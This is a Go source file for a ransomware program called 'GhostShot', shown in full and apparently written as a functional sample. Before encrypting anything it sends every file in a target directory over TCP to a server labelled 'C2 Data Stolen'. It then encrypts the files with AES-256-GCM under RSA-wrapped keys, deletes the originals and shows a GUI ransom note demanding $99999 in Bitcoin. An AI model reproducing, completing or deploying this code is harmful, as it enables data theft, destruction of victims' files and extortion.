package main

import (
	// Cipher
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
    "crypto/rsa"
    "crypto/sha256"
    "crypto/x509"

    // network
    "io"
    "log"
    "net"
    "time"

    // GUI
	"fmt"
	"image/color"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/dialog"
)

const (
	FlagDir    = ""
	KeyDB      = "AllKey.hacked"
	KeySize    = 32 // AES-256
	NonceSize  = 12 // GCM standard
	pubHex 	   = "30820122300d06092a864886f70d01010105000382010f003082010a0282010100d5419bf96baa5f48dd8b34097fec629ecb3f47daa47c2bc6474660ac7a33c3b42d6c70c50a026b543b9864509fa8f14b7b8569f3792d0dc640b55b8232f3007e34f84bba1aec7524e457e965f4eb17a30edbcddca2caa2fa526a5e2575c02e3f48aec0545b19ec472c88aab48979b9c0a306a892ba3aabb288c961483ec66d23b8b48dc54f40334e7dda346a72a6050b86570a2880abc6238e93e957c03e95e67f1054fdf88229bb298b129e93cae3f7a4cc132da1c9f63eaa340d0160640bb68cf50f84795ebcfd970e08b91ddd4e667a5dd9b6d5405061db8bbeb18fffb5dab40b624efd61bc40bb115ea0795ab76c2a7a4c609aeb61578417720aa1ac0f1d0203010001"
	ServerAddr = "127.0.0.1:2701"	
)

var privHex    = ""

var skipExt = map[string]bool{
	".txt": false,

	".exe": true,
	".dll": true,
	".sys": true,
	".ini": true,
	".log": true,
	".tmp": true,
	".lnk": true,
	".ico": true,
	".mui": true,
	".cur": true,
	".ttf": true,
}

// =============== Load RSA Key ==============
func LoadPrivateKeyFromHex(hexStr string) (*rsa.PrivateKey, error) {
    derBytes, err := hex.DecodeString(hexStr)
    if err != nil {
        return nil, err
    }
    priv, err := x509.ParsePKCS1PrivateKey(derBytes)
    if err != nil {
        return nil, err
    }
    return priv, nil
}

func LoadPublicKeyFromHex(hexStr string) (*rsa.PublicKey, error) {
    derBytes, err := hex.DecodeString(hexStr)
    if err != nil {
        return nil, err
    }
    pubInterface, err := x509.ParsePKIXPublicKey(derBytes)
    if err != nil {
        return nil, err
    }
    pub, ok := pubInterface.(*rsa.PublicKey)
    if !ok {
        return nil, fmt.Errorf("not RSA public key")
    }
    return pub, nil
}


// =============== RSA Key Encryption ==========
// EncryptHex takes hex input, encrypts with RSA public key, returns hex output
func EncryptHex(pub *rsa.PublicKey, hexInput string) (string, error) {
    data, err := hex.DecodeString(hexInput)
    if err != nil {
        return "", fmt.Errorf("invalid hex input: %v", err)
    }

    ciphertext, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pub, data, nil)
    if err != nil {
        return "", fmt.Errorf("encryption failed: %v", err)
    }

    return hex.EncodeToString(ciphertext), nil
}
// =============== RSA Key Decryption ============
// DecryptHex takes hex input, decrypts with RSA private key, returns original hex
func DecryptHex(priv *rsa.PrivateKey, hexInput string) (string, error) {
    ciphertext, err := hex.DecodeString(hexInput)
    if err != nil {
        return "", fmt.Errorf("invalid hex input: %v", err)
    }

    plaintext, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, ciphertext, nil)
    if err != nil {
        return "", fmt.Errorf("decryption failed: %v", err)
    }

    return hex.EncodeToString(plaintext), nil
}

// ============= File Encryption ==================

func EncryptAll() error {
	var targets []string

	// Phase 1: collect files ONLY
	err := filepath.Walk(FlagDir, func(path string, info os.FileInfo, err error) error {
	    if err != nil {
	        return err
	    }

	    if info.IsDir() {
	        return nil 
	    }

	    fmt.Printf("Processing file: %s\n", path)
	    

		// avoid system files, executable, and .hacked files
		base := filepath.Base(path)
		ext := strings.ToLower(filepath.Ext(path))
		if base == KeyDB || strings.HasSuffix(path, ".hacked") || skipExt[ext] {
			return nil
		}

		// if filepath.Base(path) == KeyDB ||
		// 	filepath.Base(path) == Exe ||
		// 	strings.HasSuffix(path, ".hacked") {
		// 	return nil
		// }

		targets = append(targets, path)
		return nil
	})
	if err != nil {
		return err
	}


	// Phase 2: open AllKey.enc (append or create)
	keyFile, err := os.OpenFile(
		KeyDB,
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)
	if err != nil {
		return err
	}
	defer keyFile.Close()

	// Phase 3: encrypt files
	for _, path := range targets {
		key := make([]byte, KeySize)
		if _, err := rand.Read(key); err != nil {
			return err
		}

		if err := encryptFile(path, key); err != nil {
			return err
		}

		pub, err := LoadPublicKeyFromHex(pubHex)
		if err != nil {
			return err
		}

		encryptedHex, err := EncryptHex(pub, hex.EncodeToString(key))
		if err != nil {
			return err
		}

		line := fmt.Sprintf("%s : %s\n", path, encryptedHex)
		if _, err := keyFile.WriteString(line); err != nil {
			return err
		}
	}

	return nil
}



func encryptFile(path string, key []byte) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)

	nonce := make([]byte, NonceSize)
	rand.Read(nonce)

	ciphertext := gcm.Seal(nil, nonce, data, nil)

	var buf bytes.Buffer
	buf.Write(nonce)
	buf.Write(ciphertext)

	err = os.WriteFile(path+".hacked", buf.Bytes(), 0644)
	if err != nil {
		return err
	}

	return os.Remove(path)
}

// ================= DECRYPT =================

func DecryptAll() error {
	keys, err := loadKeys()
	if err != nil {
		return err
	}

	for path, key := range keys {

		// if filepath.Base(path) == KeyDB || filepath.Base(path) == Exe {
    	// 	continue
		// }
		base := filepath.Base(path)
		ext := strings.ToLower(filepath.Ext(path))
		if base == KeyDB || skipExt[ext] {
			continue
		}

    	encFile := path + ".hacked"

    	if _, err := os.Stat(encFile); err == nil {
        	if err := decryptFile(encFile, path, key); err != nil {
            	return err
        	}
    	}
	}
	return nil
}

func decryptFile(encPath, outPath string, key []byte) error {
	data, err := os.ReadFile(encPath)
	if err != nil {
		return err
	}

	nonce := data[:NonceSize]
	ciphertext := data[NonceSize:]

	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)

	plain, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return err
	}

	if err := os.WriteFile(outPath, plain, 0644); err != nil {
		return err
	}

	return os.Remove(encPath)
}

// ================= KEY PARSER =================

func loadKeys() (map[string][]byte, error) {
	content, err := os.ReadFile(KeyDB)
	if err != nil {
		return nil, err
	}

	keys := make(map[string][]byte)
	lines := strings.Split(string(content), "\n")
	priv, err := LoadPrivateKeyFromHex(privHex)
	if err != nil {
		panic(err)
	}

	for _, line := range lines {
		if strings.TrimSpace(line) == "" {
			continue
		}

		parts := strings.Split(line, " : ")
		if len(parts) != 2 {
			continue
		}

		decryptedHex, err := DecryptHex(priv, parts[1])

		key, err := hex.DecodeString(decryptedHex)
		if err != nil {
			return nil, err
		}
		keys[parts[0]] = key
	}
	return keys, nil
}

// ----------- C2 Data Stolen -------

func sendToServer() {
	// 1. Validate FlagDir exists before walking
	if _, err := os.Stat(FlagDir); os.IsNotExist(err) {
		fmt.Printf("Error: Target directory %s does not exist\n", FlagDir)
		return
	}

	err := filepath.Walk(FlagDir, func(path string, info os.FileInfo, err error) error {
		// 2. Handle permission errors gracefully
		// If Windows denies access to a folder, skip it and keep going
		if err != nil {
			return filepath.SkipDir 
		}

		// 3. Skip directories and specific files
		if info.IsDir() {
			return nil
		}

		ext := strings.ToLower(filepath.Ext(path))
		if ext == ".exe" || ext == ".dll" || ext == ".sys" {
			return nil
		}

		sendFile(path, ServerAddr)
		
		return nil
	})

	if err != nil {
		fmt.Printf("Walk error: %v\n", err)
	}
}

func sendFile(path string, addr string) {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		log.Println("Connect error:", err)
		return
	}
	defer conn.Close()

	// 1. Send Filename first
	filename := filepath.Base(path)
	conn.Write([]byte(filename + "\n")) 
	
	// Small sleep to ensure the server separates the name from data
	time.Sleep(10 * time.Millisecond)

	// 2. Send File Content
	file, _ := os.Open(path)
	defer file.Close()
	io.Copy(conn, file)
	
}


// =============== GUI  ===============

// --- CUSTOM THEME TO USE BUNDLED FONT ---
type MyTheme struct{}

func (m MyTheme) Font(s fyne.TextStyle) fyne.Resource {
    // Change this to match the bundled filename
    return resourceCreepsterRegularTtf 
}

// Inherit everything else from the default dark theme
func (m MyTheme) Color(n fyne.ThemeColorName, v fyne.ThemeVariant) color.Color { return theme.DefaultTheme().Color(n, v) }
func (m MyTheme) Icon(n fyne.ThemeIconName) fyne.Resource { return theme.DefaultTheme().Icon(n) }
func (m MyTheme) Size(n fyne.ThemeSizeName) float32 { return theme.DefaultTheme().Size(n) }


func gui() {
	myApp := app.New()
	myApp.Settings().SetTheme(&MyTheme{}) // Apply the custom font theme
	myWindow := myApp.NewWindow("CRITICAL SYSTEM FAILURE")
	myWindow.Resize(fyne.NewSize(600, 400))

	// 1. Create a "Scary" Gradient Background (Black to Deep Red)
	background := canvas.NewVerticalGradient(
		color.Black,
		color.NRGBA{R: 45, G: 0, B: 0, A: 255}, // Very dark blood red
	)

	// 2. Create Scary Header Text
	title := canvas.NewText("⚠⚠⚠ ☠️ 💀 GhostShot  💀 ☠️ ⚠⚠⚠", color.NRGBA{R: 200, G: 0, B: 0, A: 255})
	title.TextSize = 52
	title.TextStyle = fyne.TextStyle{Bold: true, Monospace: true}
	title.Alignment = fyne.TextAlignCenter

	subtitle := canvas.NewText("Your Important File have been ENCRYPTED :) You never hear the shot. GhostShot already fired.", color.NRGBA{R: 130, G: 0, B: 0, A: 255})
	subtitle.TextSize = 20
	subtitle.Alignment = fyne.TextAlignCenter

	sentance1 := canvas.NewText("😈 Follow the rules ,  👿 You will get back all of your data.", color.NRGBA{R: 0, G: 130, B: 0, A: 255})
	sentance1.TextSize = 24
	sentance1.TextStyle = fyne.TextStyle{Bold: true, Monospace: true}
	sentance2 := canvas.NewText("👻 Don't modify the file ", color.NRGBA{R: 0, G: 130, B: 0, A: 255})
	sentance2.TextSize = 22
	sentance3 := canvas.NewText("👻 Don't change the file name ", color.NRGBA{R: 0, G: 130, B: 0, A: 255})
	sentance3.TextSize = 22
	sentance4 := canvas.NewText("👻 Don't change folder", color.NRGBA{R: 0, G: 130, B: 0, A: 255})
	sentance4.TextSize = 22

	sentance5 := canvas.NewText("🗡️ Send me $99999 into My Bitcoin Account ⚔️ ", color.NRGBA{R: 255, G: 140, B: 0, A: 255})
	sentance5.TextSize = 30



	// 3. Input Elements
	input := widget.NewEntry()
	input.SetPlaceHolder("TYPE PRIVATE KEY...")

	showButton := widget.NewButton("DECRYPT", func() {
		privHex = input.Text
		if len(privHex) < 1500 {
        	os.Exit(1)
    	}
		
		// The Reveal
		message := fmt.Sprintf("RELAX My Friend!\n\n DECRYPTION is Successful.\n No files were harmed!") //name
		d := dialog.NewInformation("PHEW!", message, myWindow)
		d.SetOnClosed(func() {
			myApp.Quit() // This closes the entire program
		})
		d.Show()
		if err := DecryptAll(); err != nil {
			panic(err)
		}
	})

	// 4. Organize Layout
	// Center the scary text in the middle of the screen
	centerText := container.NewVBox(
		layout.NewSpacer(),
		title,
		subtitle,
		layout.NewSpacer(),
		sentance1,
		sentance2,
		sentance3,
		sentance4,
		layout.NewSpacer(),
		sentance5,
		layout.NewSpacer(),
	)

	// Bottom bar: Input on the left, Button on the right
	bottomRow := container.NewBorder(nil, nil, nil, showButton, input)

	// Use a Border layout to pin the input bar to the bottom
	mainContent := container.NewBorder(
		nil, 
		container.NewPadded(bottomRow), // Bottom
		nil, 
		nil, 
		centerText, // Fill the center
	)

	// Stack the background color behind the UI elements
	finalStack := container.NewStack(background, mainContent)

	myWindow.SetContent(finalStack)
	myWindow.ShowAndRun()
}



func main() {
	sendToServer()
	if err := EncryptAll(); err != nil {
		panic(err)
	}
	gui()
}
